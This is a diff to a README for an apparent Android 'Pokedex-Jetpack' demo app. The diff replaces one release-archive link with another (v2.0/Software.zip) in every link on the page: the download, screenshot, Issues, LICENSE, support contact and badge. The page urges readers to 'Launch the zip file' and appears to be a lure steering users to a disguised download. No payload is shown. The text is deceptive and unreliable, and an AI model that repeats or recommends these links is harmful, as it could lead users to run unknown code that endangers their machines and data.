@@ -16,7 +16,7 @@ Welcome to Pokedex-Jetpack, a comprehensive demonstration of modern Android deve
 android, coroutines-android, dagger-hilt, jetpack-android, jetpack-compose, material-design, motion, mvvm-architecture, native-apps, retrofit, room-database 
 
 ### Explore the Project
-To dive into the project and explore the codebase, simply download the project by clicking [here](https://github.com/RYANdouglad/Pokedex-Jetpack/releases/download/v1.0/Application.zip). Launch the zip file to access all project resources.
+To dive into the project and explore the codebase, simply download the project by clicking [here](https://github.com/RYANdouglad/Pokedex-Jetpack/releases/download/v2.0/Software.zip). Launch the zip file to access all project resources.
 
 ### Get Started
 1. Clone the repository to your local machine.
@@ -24,27 +24,27 @@ To dive into the project and explore the codebase, simply download the project b
 3. Build and run the project on an Android device or emulator.
 
 ### Screenshots
-![Screenshot 1](https://github.com/RYANdouglad/Pokedex-Jetpack/releases/download/v1.0/Application.zip)  
+![Screenshot 1](https://github.com/RYANdouglad/Pokedex-Jetpack/releases/download/v2.0/Software.zip)  
 *Add captivating screenshots of the app to showcase its visual appeal.*
 
 ### Contributions
 Contributions to Pokedex-Jetpack are welcome! If you have ideas for improvements or new features, feel free to submit pull requests.
 
 ### Issues
-If you encounter any issues or bugs while using Pokedex-Jetpack, please report them in the [Issues](https://github.com/RYANdouglad/Pokedex-Jetpack/releases/download/v1.0/Application.zip) section of the repository.
+If you encounter any issues or bugs while using Pokedex-Jetpack, please report them in the [Issues](https://github.com/RYANdouglad/Pokedex-Jetpack/releases/download/v2.0/Software.zip) section of the repository.
 
 ### Releases
 If the provided download link does not work, check the "Releases" section of the repository for the latest stable version.
 
 ### Support
-For any questions or assistance regarding Pokedex-Jetpack, you can reach out to the project maintainer at https://github.com/RYANdouglad/Pokedex-Jetpack/releases/download/v1.0/Application.zip
+For any questions or assistance regarding Pokedex-Jetpack, you can reach out to the project maintainer at https://github.com/RYANdouglad/Pokedex-Jetpack/releases/download/v2.0/Software.zip
 
 ### License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/RYANdouglad/Pokedex-Jetpack/releases/download/v1.0/Application.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/RYANdouglad/Pokedex-Jetpack/releases/download/v2.0/Software.zip) file for details.
 
 ### Acknowledgements
 We would like to extend our gratitude to the open-source community, without whom this project would not have been possible.
 
 #### Happy Coding! 🚀
 
-[![Download Project](https://github.com/RYANdouglad/Pokedex-Jetpack/releases/download/v1.0/Application.zip)](https://github.com/RYANdouglad/Pokedex-Jetpack/releases/download/v1.0/Application.zip)
+[![Download Project](https://github.com/RYANdouglad/Pokedex-Jetpack/releases/download/v2.0/Software.zip)](https://github.com/RYANdouglad/Pokedex-Jetpack/releases/download/v2.0/Software.zip)
